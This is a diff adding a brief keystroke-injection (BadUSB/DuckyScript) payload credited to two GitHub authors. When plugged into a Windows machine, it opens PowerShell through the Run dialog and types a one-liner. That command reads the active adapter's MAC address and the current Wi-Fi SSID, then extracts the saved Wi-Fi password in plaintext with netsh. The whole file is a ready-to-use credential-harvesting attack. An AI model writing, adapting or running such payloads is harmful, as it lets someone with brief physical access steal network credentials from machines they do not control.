@@ -1,0 +1,9 @@
+REM
+REM Made by M-Ouxi & Crzy-Milano (https://github.com/M-Ouxi) & (https://github.com/Crzy-Milano)
+REM
+
+GUI r
+DELAY 1000
+Powershell
+DELAY 1500
+STRINGLN $mac=(Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object -First 1 -ExpandProperty MacAddress); $ssid=(netsh wlan show interfaces | Select-String "^\s*SSID\s*:").ToString().Split(":")[1].Trim(); $pass=(netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); Write-Host "MAC : $mac"; Write-Host "SSID: $ssid"; Write-Host "PASS: $pass"
